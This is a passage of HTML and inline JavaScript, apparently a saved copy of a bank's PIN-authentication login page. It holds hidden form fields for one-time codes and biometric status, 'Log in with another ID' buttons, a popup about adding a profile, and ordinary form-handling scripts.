                                                        <div><label for="C2__C2__C1__QUE_A275A95A412B204C140222">HiddenEvent</label><span id="C2__C2__C1__p2_QUE_A275A95A412B204C140222"> </span></div>
                                                    </div>
                                                    <div class="ecDIB  " id="C2__C2__C1__p4_QUE_A275A95A412B204C140222">
                                                        <div><select name="C2__C2__C1__WORKINGELEMENTS[1].MOBILELOGIN" id="C2__C2__C1__QUE_A275A95A412B204C140222" class="sca-event-id tc-select-padding tc-rounded-1 tc-auto-width   classic" size="0" onfocus="doOnFocus('', this.id, '');" onblur="if (FORMAT_VALIDATION_TRIGGER == getTriggeredReason() || '' == getTriggeredReason()) {doOnBlur('', this.id);}" onkeypress="return(searchList(event, this, 'C2__C2__C1__F', ''))" onchange="startJob('', 'onchange', 'C2__C2__C1__QUE_A275A95A412B204C140222');var valid=validAllChars(this, '', '', '', '', true, ['tc-error-row','tc-error-color','tc-error-color','','tc-error-color','tc-error-color-border','','','tc-error-color  tc-error-position tc-fs-m2','hide','','','','','sca-event-id','','','','hide','','','','','sca-event-id','','','','hide','','','','','sca-event-id','','','']); if (typeof T_A275A95A412B204C140222_HIDDEN_ELEMENT_IDS != 'undefined') ajaxCheckHidden(T_A275A95A412B204C140222_HIDDEN_ELEMENT_IDS, T_A275A95A412B204C140222_CONDITIONS, T_A275A95A412B204C140222_KEEP_COL_HEADING, T_A275A95A412B204C140222_SAVE_HIDDEN_DATA, T_A275A95A412B204C140222_NA_TYPE, '', 'servletcontroller', false, '', this);endJob('', 'onchange', valid, ''); return valid;" aria-required="false" aria-label="HiddenEvent" aria-describedby="C2__C2__C1__QUE_A275A95A412B204C140222_ERRORMESSAGE">
                                                                <option value="">- Please Select</option>
                                                                <option value="true">true</option>
                                                                <option value="false" selected="selected">false</option>
                                                            </select><span class="tc-error-color tc-error-position tc-fs-m2  " id="C2__C2__C1__QUE_A275A95A412B204C140222_ERRORMESSAGE" aria-live="assertive"></span></div>
                                                    </div>
                                                </div>
                                                <div id="C2__C2__C1__row_QUE_A55ED459C5FC2E83228727" class="hide  ">
                                                    <div id="C2__C2__C1__p1_QUE_A55ED459C5FC2E83228727" class="ecDIB  responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl tc-question-part tc-bold">
                                                        <div><label for="C2__C2__C1__QUE_A55ED459C5FC2E83228727">HiddenQuestionOTAC</label><span id="C2__C2__C1__p2_QUE_A55ED459C5FC2E83228727" class="tc-mand-part tc-normal-weight"> </span></div>
                                                    </div>
                                                    <div class="ecDIB  responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part  " id="C2__C2__C1__p4_QUE_A55ED459C5FC2E83228727">
                                                        <div class="ext-tc-radio-input"><input type="text" name="C2__C2__C1__WORKINGELEMENTS[1].OTAC" id="C2__C2__C1__QUE_A55ED459C5FC2E83228727" class="tc-form-control tc-half-answer-width OTAC tc-default-input tc-rounded-1  " size="15" maxlength="256" onfocus="doOnFocus('', this.id, '');" onblur="if (FORMAT_VALIDATION_TRIGGER == getTriggeredReason() || '' == getTriggeredReason()) {doOnBlur('', this.id);}" onkeypress="return(checkForDefaultButtonAction(event, this, 'C2__C2__C1__F', ''))" onchange="startJob('', 'onchange', 'C2__C2__C1__QUE_A55ED459C5FC2E83228727');trimValue(this,'');if (isLegalExpresion(this,['tc-error-row','tc-error-color','tc-error-color','','tc-error-color','tc-error-color-border','','','tc-error-color  tc-error-position tc-fs-m2','hide','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width OTAC','tc-postfix-part','tc-help-icon','','hide','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width OTAC','tc-postfix-part','tc-help-icon','','hide','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width OTAC','tc-postfix-part','tc-help-icon',''])&amp;&amp;validAllChars(this, '', '', ['Please enter a valid HiddenQuestionOTAC', '', ''], '', true, ['tc-error-row','tc-error-color','tc-error-color','','tc-error-color','tc-error-color-border','','','tc-error-color  tc-error-position tc-fs-m2','hide','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width OTAC','tc-postfix-part','tc-help-icon','','hide','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width OTAC','tc-postfix-part','tc-help-icon','','hide','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width OTAC','tc-postfix-part','tc-help-icon',''])) {endJob('', 'onchange', true, 'C2__C2__C1__QUE_A55ED459C5FC2E83228727'); return true;} else {endJob('', 'onchange', false, 'C2__C2__C1__QUE_A55ED459C5FC2E83228727'); return false;}" aria-required="false" aria-label="HiddenQuestionOTAC" aria-describedby="C2__C2__C1__QUE_A55ED459C5FC2E83228727_ERRORMESSAGE"><span class="tc-error-color tc-error-position tc-fs-m2  " id="C2__C2__C1__QUE_A55ED459C5FC2E83228727_ERRORMESSAGE" aria-live="assertive"></span></div>
                                                    </div>
                                                </div>
                                                <div id="C2__C2__C1__row_QUE_899904FF4BBE492C616629" class="hide  ">
                                                    <div id="C2__C2__C1__p1_QUE_899904FF4BBE492C616629" class="ecDIB  ">
                                                        <div><label for="C2__C2__C1__QUE_899904FF4BBE492C616629">biometricsExhausted</label><span id="C2__C2__C1__p2_QUE_899904FF4BBE492C616629">*</span></div>
                                                    </div>
                                                    <div class="ecDIB  " id="C2__C2__C1__p4_QUE_899904FF4BBE492C616629">
                                                        <div><select name="C2__C2__C1__WORKINGELEMENTS[1].HASBIOMETRICATTEMPTSEXHAUSTED" id="C2__C2__C1__QUE_899904FF4BBE492C616629" class="biometricExhaustCheck1 tc-select-padding tc-rounded-1 tc-auto-width   classic" size="0" onfocus="doOnFocus('', this.id, '');" onblur="if (FORMAT_VALIDATION_TRIGGER == getTriggeredReason() || '' == getTriggeredReason()) {doOnBlur('', this.id);}" onkeypress="return(searchList(event, this, 'C2__C2__C1__F', ''))" onchange="startJob('', 'onchange', 'C2__C2__C1__QUE_899904FF4BBE492C616629');var valid=validAllChars(this, '', '', '', '', true, ['tc-error-row','tc-error-color','tc-error-color','','tc-error-color','tc-error-color-border','','','tc-error-color  tc-error-position tc-fs-m2','hide','','','','','biometricExhaustCheck1','','','','hide','','','','','biometricExhaustCheck1','','','','hide','','','','','biometricExhaustCheck1','','','']); endJob('', 'onchange', valid, ''); return valid;" aria-required="true" aria-label="biometricsExhausted" aria-describedby="C2__C2__C1__QUE_899904FF4BBE492C616629_ERRORMESSAGE">
                                                                <option value="">- Please Select</option>
                                                                <option value="true">true</option>
                                                                <option value="false" selected="selected">false</option>
                                                            </select><span style="display: none" id="C2__C2__C1__MM_QUE_899904FF4BBE492C616629">Please select the biometricsExhausted</span><span class="tc-error-color tc-error-position tc-fs-m2  " id="C2__C2__C1__QUE_899904FF4BBE492C616629_ERRORMESSAGE" aria-live="assertive"></span></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <script type="text/javascript" id="hiddenObjectsVariables">
                                        //<![CDATA[
                                        var T_A275A95A412B204C140222_NA_TYPE = 'Hide';
                                        var T_A275A95A412B204C140222_SAVE_HIDDEN_DATA = 'false';
                                        var T_A275A95A412B204C140222_HIDDEN_ELEMENT_IDS = 'BUT_8191336CFC00C253716186';
                                        var T_A275A95A412B204C140222_CONDITIONS = '("$$INPARAMETERS[1].ISDEVICEPROVISIONING$"!="Y"&&"$$WORKINGELEMENTS[1].MOBILELOGIN$"=="true")&&(1==0)';
                                        var T_A275A95A412B204C140222_KEEP_COL_HEADING = 'false';
                                        //]]>
                                    </script>
                                    <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                                </div>
                            </div>
                            <div>
                                <div style="clear: left;" id="C2__C2__row_QUE_7613F3F070B7BABC242620" class="hide  ">
                                    <div id="C2__C2__p1_QUE_7613F3F070B7BABC242620" style="float: left;">
                                        <div><label for="C2__C2__QUE_7613F3F070B7BABC242620">HiddenUserProfiles</label><span id="C2__C2__p2_QUE_7613F3F070B7BABC242620"> </span></div>
                                    </div>
                                    <div style="float: left;" id="C2__C2__p4_QUE_7613F3F070B7BABC242620">
                                        <div class="ext-tc-radio-input"><input type="text" name="C2__C2__SCA[1].USERPROFILEJSON" id="C2__C2__QUE_7613F3F070B7BABC242620" class="userProfileJSON tc-default-input tc-rounded-1  " size="15" maxlength="256" onfocus="doOnFocus('', this.id, '');" onblur="if (FORMAT_VALIDATION_TRIGGER == getTriggeredReason() || '' == getTriggeredReason()) {doOnBlur('', this.id);}" onkeypress="return(checkForDefaultButtonAction(event, this, 'C2__C2__F', ''))" onchange="startJob('', 'onchange', 'C2__C2__QUE_7613F3F070B7BABC242620');trimValue(this,'');if (isLegalExpresion(this,['tc-error-row','tc-error-color','tc-error-color','','tc-error-color','tc-error-color-border','','','tc-error-color  tc-error-position tc-fs-m2','hide','','','','','userProfileJSON','','','','hide','','','','','userProfileJSON','','','','hide','','','','','userProfileJSON','','',''])&amp;&amp;validAllChars(this, '', '', ['Please enter a valid HiddenUserProfiles', '', ''], '', true, ['tc-error-row','tc-error-color','tc-error-color','','tc-error-color','tc-error-color-border','','','tc-error-color  tc-error-position tc-fs-m2','hide','','','','','userProfileJSON','','','','hide','','','','','userProfileJSON','','','','hide','','','','','userProfileJSON','','',''])) {endJob('', 'onchange', true, 'C2__C2__QUE_7613F3F070B7BABC242620'); return true;} else {endJob('', 'onchange', false, 'C2__C2__QUE_7613F3F070B7BABC242620'); return false;}" aria-required="false" aria-label="HiddenUserProfiles" aria-describedby="C2__C2__QUE_7613F3F070B7BABC242620_ERRORMESSAGE"><span class="tc-error-color tc-error-position tc-fs-m2  " id="C2__C2__QUE_7613F3F070B7BABC242620_ERRORMESSAGE" aria-live="assertive"></span></div>
                                    </div>
                                    <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                                </div>
                                <div style="clear: left;display: none;" id="C2__C2__row_BUT_0F5043357FD8A5C462752" class="btn-primary-large btn-coral-large boi-40px-space-top  ">
                                    <div id="C2__C2__p1_BUT_0F5043357FD8A5C462752" class="col-hidden" style="display: none;float: left;">
                                        <div>&nbsp;</div>
                                    </div>
                                    <div class="boi-text-align-center boi-float-none  " style="text-align: center; float: left;  display: none;  display: none;" id="C2__C2__p4_BUT_0F5043357FD8A5C462752">
                                        <div>
                                            <a onclick="ajaxButtonAction( 'preInGrpC2__C2__GRP_06655CFCADD764093701949', 'C2__C2____8191336CFC00C253 FormButton 3', 'C2__C2__BUT_0F5043357FD8A5C462752', false, null, '', 'servletcontroller', '', false, true, '' );" href="javascript:void(0);" class="tc-accent-bg-new tc-full-width boi-register-btn boi_label_sm" id="C2__C2__BUT_0F5043357FD8A5C462752" handlerchanged="Y" onoldclick="ajaxButtonAction( 'preInGrpC2__C2__GRP_06655CFCADD764093701949', 'C2__C2____8191336CFC00C253 FormButton 3', 'C2__C2__BUT_0F5043357FD8A5C462752', false, null, '', 'servletcontroller', '', false, true, '' );"><span><span class="fa fa-user ext-card-color"></span> Log in with another ID</span></a>

                                            <script type="text/javascript" charset="utf-8">
                                                //<![CDATA[



                                                $(function() {

                                                    function doWork(e) {












                                                        var $parent = $("html");




                                                        if (!(typeof(boiparm) == 'undefined')) {
                                                            if (typeof(boiparm.boiform) == 'function') {
                                                                boiparm.boiform('C2__C2__boi_prefs');
                                                            }
                                                        }



                                                        ajaxButtonAction('preInGrpC2__C2__GRP_06655CFCADD764093701949', 'C2__C2____8191336CFC00C253 FormButton 3', 'C2__C2__BUT_0F5043357FD8A5C462752', false, null, '', 'servletcontroller', '', false, true, '');




                                                    }
                                                    var $el = $("#C2__C2__BUT_0F5043357FD8A5C462752:not([handlerChanged='Y'])");
                                                    $el.attr("handlerChanged", "Y")
                                                        .attr("onoldclick", $el.attr("onclick"))
                                                        .removeProp("onclick");
                                                    if (!$el.hasClass("boi-delegate-click-to-container") && ("" === "")) {
                                                        $el.on("click", function(e) {
                                                            doWork(e);
                                                        });
                                                    }

                                                    //Add support for space bar button click
                                                    $("#C2__C2__BUT_0F5043357FD8A5C462752").keydown(function(e) {
                                                        if (e.which == 32) {
                                                            $("#C2__C2__BUT_0F5043357FD8A5C462752").click();
                                                            e.preventDefault();
                                                        }
                                                    });
                                                });
                                                //]]>
                                            </script>
                                        </div>
                                    </div>
                                    <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                                </div>
                                <div style="clear: left;display: none;" id="C2__C2__row_BUT_D8168476A4BD56FD713031" class="btn-primary-large btn-coral-large  ">
                                    <div id="C2__C2__p1_BUT_D8168476A4BD56FD713031" class="col-hidden" style="display: none;float: left;">
                                        <div>&nbsp;</div>
                                    </div>
                                    <div class="tc-full-button-xs tc-full-width  " style="text-align: center; float: left;  display: none;  display: none;" id="C2__C2__p4_BUT_D8168476A4BD56FD713031">
                                        <div>
                                            <a onclick="ajaxButtonAction( 'preInGrpC2__C2__GRP_06655CFCADD764093701949', 'C2__C2____7F0E7D5631BEC2D8 FormButton 83', 'C2__C2__BUT_D8168476A4BD56FD713031', false, null, '', 'servletcontroller', '', false, true, '' );" href="javascript:void(0);" class="tc-accent-bg-new tc-button-color tc-button tc-rounded-1 Btn_secondary tc-full-width boi-register-btn" id="C2__C2__BUT_D8168476A4BD56FD713031" handlerchanged="Y" onoldclick="ajaxButtonAction( 'preInGrpC2__C2__GRP_06655CFCADD764093701949', 'C2__C2____7F0E7D5631BEC2D8 FormButton 83', 'C2__C2__BUT_D8168476A4BD56FD713031', false, null, '', 'servletcontroller', '', false, true, '' );" role="button"><span><span class="fa fa-user ext-card-color"></span><span aria-label="Login with another I D" tabindex="0" aria-level="2"> Log in with another ID</span></span></a>

                                            <script type="text/javascript" charset="utf-8">
                                                //<![CDATA[



                                                $(function() {

                                                    function doWork(e) {




                                                        e.preventDefault();
                                                        e.stopPropagation();
                                                        try {
                                                            window.boiCbs.openDialog({
                                                                id: "C2__C2__BUT_D8168476A4BD56FD713031"
                                                                , COMPONENT_ID_PREFIX: "C2__C2__"
                                                                , IdToUpdate: "FMT_327292FC505097A7172536"
                                                                , ClassToRemove: ""
                                                                , ClassToToggle: ""
                                                                , ClassToAdd: ""
                                                                , ParentContextSelector: ""
                                                                , AnimationType: ""
                                                            })
                                                        } catch (e) {
                                                            log("Problem running javascript function: window.boiCbs.openDialog");
                                                        }









                                                        var $parent = $("html");




                                                        if (!(typeof(boiparm) == 'undefined')) {
                                                            if (typeof(boiparm.boiform) == 'function') {
                                                                boiparm.boiform('C2__C2__boi_prefs');
                                                            }
                                                        }




                                                    }
                                                    var $el = $("#C2__C2__BUT_D8168476A4BD56FD713031:not([handlerChanged='Y'])");
                                                    $el.attr("handlerChanged", "Y")
                                                        .attr("onoldclick", $el.attr("onclick"))
                                                        .removeProp("onclick");
                                                    if (!$el.hasClass("boi-delegate-click-to-container") && ("" === "")) {
                                                        $el.on("click", function(e) {
                                                            doWork(e);
                                                        });
                                                    }

                                                    //Add support for space bar button click
                                                    $("#C2__C2__BUT_D8168476A4BD56FD713031").keydown(function(e) {
                                                        if (e.which == 32) {
                                                            $("#C2__C2__BUT_D8168476A4BD56FD713031").click();
                                                            e.preventDefault();
                                                        }
                                                    });
                                                });
                                                //]]>
                                            </script>
                                        </div>
                                    </div>
                                    <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                                </div>
                            </div>
                            <div style="clear: both; " id="C2__C2__FMT_2CA27864C30804CF450143" class="boi-login-forgotPIN boi-mb-5 button-with-popup col-4-8-xs col-6-8-sm col-6-12-lg">
                                <div style="clear: both">
                                    <div id="C2__C2__COL_2CA27864C30804CF450849" class="button-with-popup col-hidden" style="float: left;">
                                        <div>
                                            <div style="clear: both; " id="C2__C2__FMT_327292FC505097A7172536" class="boi-position-center boi-popup-dialog__wrapper boi-popup-wide">
                                                <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                                                <div>
                                                    <div id="C2__C2__p1_GRP_D8168476A4BD56FD713044" style="position: relative">
                                                        <div style="clear: both; " id="C2__C2__FMT_327292FC505097A7172588" class="boi-popup-dialog__title--background boi-flex--horizontal--justify boi-flex">
                                                            <div style="clear: both">
                                                                <div style="clear: left;" id="C2__C2__row_HEAD_D8168476A4BD56FD713045">
                                                                    <div id="C2__C2__p1_HEAD_D8168476A4BD56FD713045" style="float: left;">
                                                                        <div>
                                                                            <h1 id="C2__C2__HEAD_D8168476A4BD56FD713045" class="boi-popup-dialog__title  ">Adding a new profile?</h1>
                                                                        </div>
                                                                    </div>
                                                                    <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                                                                </div>
                                                            </div>
                                                            <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                                                        </div>
                                                        <div style="clear: both; " id="C2__C2__FMT_327292FC505097A7172625" class="boi-padding-20">
                                                            <div style="clear: both">
                                                                <div style="clear: left;" id="C2__C2__row_HEAD_D8168476A4BD56FD713046" class="margin-top18 boi-mb-20  ">
                                                                    <div id="C2__C2__p1_HEAD_D8168476A4BD56FD713046" style="float: left;">
                                                                        <div>
                                                                            <h3 id="C2__C2__HEAD_D8168476A4BD56FD713046" class="boi_label_sm_regular  ">To do this, first disable any existing fingerprint or face recognition in the profile section. Biometric login will not work when a device is used by multiple profiles.</h3>
                                                                        </div>
                                                                    </div>
                                                                    <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                                                                </div>
                                                                <div style="clear: left;" id="C2__C2__row_BUT_D8168476A4BD56FD713047" class="btn-primary-large text-center boi-mt-25 boi-mb-15  ">
                                                                    <div id="C2__C2__p1_BUT_D8168476A4BD56FD713047" class="col-hidden" style="float: left;">
                                                                        <div>&nbsp;</div>
                                                                    </div>
                                                                    <div class="col-full-xs col-full-sm tc-center-align  " style="text-align: center; float: left;  " id="C2__C2__p4_BUT_D8168476A4BD56FD713047">
                                                                        <div><button title="OK" onclick="ajaxButtonAction( 'prevQ', 'C2__C2____A44D8E06F390CD68 FormButton 100', 'C2__C2__BUT_D8168476A4BD56FD713047', false, null, '', 'servletcontroller', '', false, true, '' );" type="button" name="C2__C2____A44D8E06F390CD68 FormButton 100" value="OK" class="boi-rounded-1 boi-primary-card-button boi-full-width Btn_primary boi-close-popup boi-exit-popup boi-overlay-btn-270" id="C2__C2__BUT_D8168476A4BD56FD713047">OK</button></div>
                                                                    </div>
                                                                    <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                                                                </div>
                                                            </div>
                                                            <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                                                        </div>
                                                        <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                            </div>
                            <div>
                                <div style="clear: left;display: none;" id="C2__C2__row_BUT_554E9D0F787A94B7523609" class="boi-float-none boi-bring-up34 boi-securityconcern-align-right float-right  ">
                                    <div id="C2__C2__p1_BUT_554E9D0F787A94B7523609" class="col-hidden" style="display: none;float: left;">
                                        <div>&nbsp;</div>
                                    </div>
                                    <div class="float-right  " style="text-align: right; float: left;  display: none;  display: none;" id="C2__C2__p4_BUT_554E9D0F787A94B7523609">
                                        <div><a onclick="return buttonClicked('C2__C2____554E9D0F787A94B7 FormButton 42', false, null, '', false, 'C2__C2__BUT_554E9D0F787A94B7523609', false, true, '', true, true, null);" href="javascript:void(0);" class="boi_link tc-no-decoration float-right" id="C2__C2__BUT_554E9D0F787A94B7523609"><span>Security concerns?</span></a></div>
                                    </div>
                                    <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                                </div>
                            </div>
                        </div>
                        <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                    </div>
                    <div style="clear: both; " id="C2__C2__FMT_EA4E6FDB2E79E881134810" class="col-full p-x-20 boi-clear-both bg-white boi-login-desktop-padding">
                        <div style="clear: both">
                            <div style="clear: left;" id="C2__C2__row_BUT_EA4E6FDB2E79E881134806">
                                <div id="C2__C2__p1_BUT_EA4E6FDB2E79E881134806" class="col-hidden" style="float: left;">
                                    <div>&nbsp;</div>
                                </div>
                                <div class="col-full text-center  " style="text-align: center; float: left;  " id="C2__C2__p4_BUT_EA4E6FDB2E79E881134806">
                                    <div><a onclick="ajaxButtonAction( null, 'C2__C2____EA4E6FDB2E79E881 FormButton 65', 'C2__C2__BUT_EA4E6FDB2E79E881134806', false, null, '', 'servletcontroller', '', false, true, '' );" href="javascript:void(0);" class="boi-btn-transparent boi_input_blue center-aligned col-full boi-mb-7" id="C2__C2__BUT_EA4E6FDB2E79E881134806"><span>Security concerns?</span></a></div>
                                </div>
                                <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                            </div>
                        </div>
                        <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                    </div>
                    <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                </div>
                <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                <div>
                    <div style="clear: left;" id="C2__C2__row_BUT_63503B739980C9E0240614" class="col-hidden  ">
                        <div id="C2__C2__p1_BUT_63503B739980C9E0240614" style="float: left;">
                            <div>&nbsp;</div>
                        </div>
                        <div style="text-align: left; float: left;  " id="C2__C2__p4_BUT_63503B739980C9E0240614">
                            <div><button title="UnRegisteredDeviceDetected" onclick="return buttonClicked('C2__C2____63503B739980C9E0 FormButton 70', false, null, '', false, 'C2__C2__BUT_63503B739980C9E0240614', true, true, '', true, true, null);" type="button" name="C2__C2____63503B739980C9E0 FormButton 70" value="UnRegisteredDeviceDetected" class="un-registered-device-detected" id="C2__C2__BUT_63503B739980C9E0240614">UnRegisteredDeviceDetected</button></div>
                        </div>
                        <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                    </div>
                </div>
                <div style="clear: both; display: none;padding-left:1rem;padding-right:1rem;" id="C2__C2__FMT_05327919EC53E7D6132546" class="boi_grey_light_background wating-approval-pull-section">
                    <div style="clear: both; width: 100%">
                        <div id="C2__C2__COL_05327919EC53E7D6132584" style="float: left;width: 33%; width:15%">
                            <div>
                                <div style="clear: left;" id="C2__C2__row_TXT_05327919EC53E7D6132585">
                                    <div id="C2__C2__TXT_05327919EC53E7D6132585" style="text-align: left; ">
                                        <div>
                                            <div aria-hidden="true" style="clear: left;">
                                                <div class="boi-use-pin-instead-icon">
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div id="C2__C2__COL_05327919EC53E7D6132586" class="p-x-10 p-y-10" style="float: left;width: 33%; width:80%;">
                            <div>
                                <div style="clear: left;" id="C2__C2__row_TXT_05327919EC53E7D6132587">
                                    <div id="C2__C2__TXT_05327919EC53E7D6132587" style="text-align: left; ">
                                        <div class="boi-biometric-pin-message"><span class="boi-font-regular boi_grey_dark boi-font-size-14 boi-use-pin-instead-icon" style="position:relative;margin-left: -6px;">Use instead</span><br></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div id="C2__C2__COL_05327919EC53E7D6132588" style="float: left;width: 33%; width:5%;">
                            <div>
                                <div style="clear: left;" id="C2__C2__row_TXT_05327919EC53E7D6132589">
                                    <div id="C2__C2__TXT_05327919EC53E7D6132589" style="text-align: left; ">
                                        <div><i class="fa fa-chevron-right chevron-homepage-mobile boi-waiting-for-pull-select-arrow" style="position: absolute;padding-top: 22px;" aria-label=" . Use your ID instead"></i><br></div>
                                    </div>
                                </div>
                                <div style="clear: left;" id="C2__C2__row_BUT_9E0AA1E80D6C9904110746" class="col-hidden  ">
                                    <div id="C2__C2__p1_BUT_9E0AA1E80D6C9904110746" style="float: left;">
                                        <div>&nbsp;</div>
                                    </div>
                                    <div style="text-align: left; float: left;  " id="C2__C2__p4_BUT_9E0AA1E80D6C9904110746">
                                        <div><button title="SessionMisMatchDeviceDetected" onclick="return buttonClicked('C2__C2____9E0AA1E80D6C9904 FormButton 89', false, null, '', false, 'C2__C2__BUT_9E0AA1E80D6C9904110746', true, true, '', true, true, null);" type="button" name="C2__C2____9E0AA1E80D6C9904 FormButton 89" disabled="disabled" value="SessionMisMatchDeviceDetected" class="session-mismatch-device-detected" id="C2__C2__BUT_9E0AA1E80D6C9904110746" tabindex="-1">SessionMisMatchDeviceDetected</button></div>
                                    </div>
                                    <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                                </div>
                                <div style="clear: left;" id="C2__C2__row_BUT_ABF45DAD3DF2235B1930229" class="hide  ">
                                    <div id="C2__C2__p1_BUT_ABF45DAD3DF2235B1930229" style="float: left;">
                                        <div>&nbsp;</div>
                                    </div>
                                    <div style="text-align: left; float: left;  " id="C2__C2__p4_BUT_ABF45DAD3DF2235B1930229">
                                        <div>
                                            <a onclick="ajaxButtonAction( 'preInGrpC2__C2__GRP_06655CFCADD764093701949', 'C2__C2____ABF45DAD3DF2235B FormButton 82', 'C2__C2__BUT_ABF45DAD3DF2235B1930229', false, null, '', 'servletcontroller', '', false, true, '' );" href="javascript:void(0);" class="boi-hidden-use-pin-instead-btn" id="C2__C2__BUT_ABF45DAD3DF2235B1930229" handlerchanged="Y" onoldclick="ajaxButtonAction( 'preInGrpC2__C2__GRP_06655CFCADD764093701949', 'C2__C2____ABF45DAD3DF2235B FormButton 82', 'C2__C2__BUT_ABF45DAD3DF2235B1930229', false, null, '', 'servletcontroller', '', false, true, '' );"><span>&nbsp;</span></a>

                                            <script type="text/javascript" charset="utf-8">
                                                //<![CDATA[



                                                $(function() {

                                                    function doWork(e) {












                                                        var $parent = $("html");




                                                        if (!(typeof(boiparm) == 'undefined')) {
                                                            if (typeof(boiparm.boiform) == 'function') {
                                                                boiparm.boiform('C2__C2__boi_prefs');
                                                            }
                                                        }



                                                        ajaxButtonAction('preInGrpC2__C2__GRP_06655CFCADD764093701949', 'C2__C2____ABF45DAD3DF2235B FormButton 82', 'C2__C2__BUT_ABF45DAD3DF2235B1930229', false, null, '', 'servletcontroller', '', false, true, '');




                                                    }
                                                    var $el = $("#C2__C2__BUT_ABF45DAD3DF2235B1930229:not([handlerChanged='Y'])");
                                                    $el.attr("handlerChanged", "Y")
                                                        .attr("onoldclick", $el.attr("onclick"))
                                                        .removeProp("onclick");
                                                    if (!$el.hasClass("boi-delegate-click-to-container") && ("" === "")) {
                                                        $el.on("click", function(e) {
                                                            doWork(e);
                                                        });
                                                    }

                                                    //Add support for space bar button click
                                                    $("#C2__C2__BUT_ABF45DAD3DF2235B1930229").keydown(function(e) {
                                                        if (e.which == 32) {
                                                            $("#C2__C2__BUT_ABF45DAD3DF2235B1930229").click();
                                                            e.preventDefault();
                                                        }
                                                    });
                                                });
                                                //]]>
                                            </script>
                                        </div>
                                    </div>
                                    <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                                </div>
                                <div style="clear: left;" id="C2__C2__row_TXT_05327919EC53E7D6176791">
                                    <div id="C2__C2__TXT_05327919EC53E7D6176791" style="text-align: left; ">
                                        <div>
                                            <script>
                                                $('.boi-use-pin-instead-icon').on('click', function() {
                                                    $('.boi-hidden-use-pin-instead-btn').click();
                                                });
                                            </script>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                </div>
                <div style="clear: both; display: none;" id="C2__C2__FMT_B4CDE349AD213518154104" class="tc-card-body boi-waiting-for-pull-body boi_grey_light_background wating-approval-pull-section">
                    <div style="clear: both; width: 100%">
                        <div id="C2__C2__COL_62DD69BBB46EE82C173643" style="float: left;width: 33%; width:15%">
                            <div>
                                <div style="clear: left;" id="C2__C2__row_TXT_62DD69BBB46EE82C174050">
                                    <div id="C2__C2__TXT_62DD69BBB46EE82C174050" style="text-align: left; ">
                                        <div>
                                            <div aria-hidden="true" style="clear: left;">
                                                <div class="boi-waiting-for-pull-icon">
                                                    <img src="./PIN Authentication - /pull-icon.svg" alt="Waiting for approval icon" title="Wating for apporoval icon" role="img"></div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div id="C2__C2__COL_62DD69BBB46EE82C173648" class="p-x-10" style="float: left;width: 33%; width:80%;">
                            <div>
                                <div style="clear: left;" id="C2__C2__row_TXT_B4CDE349AD213518154592">
                                    <div id="C2__C2__TXT_B4CDE349AD213518154592" style="text-align: left; ">
